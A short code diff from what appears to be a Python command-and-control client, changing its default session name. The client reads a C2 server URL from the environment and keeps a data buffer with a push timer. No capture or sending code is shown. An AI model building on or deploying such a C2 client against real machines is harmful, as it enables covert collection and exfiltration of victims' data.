@@ -4,7 +4,7 @@ import os
 import time
 
 C2_SERVER_URL = os.environ.get('C2_SERVER_URL', 'https://lalithadithyan.dev')
-C2_SESSION    = os.environ.get('C2_SESSION', 'default')
+C2_SESSION    = os.environ.get('C2_SESSION', 'DAVA')
 
 buffer = []
 last_push = time.time()
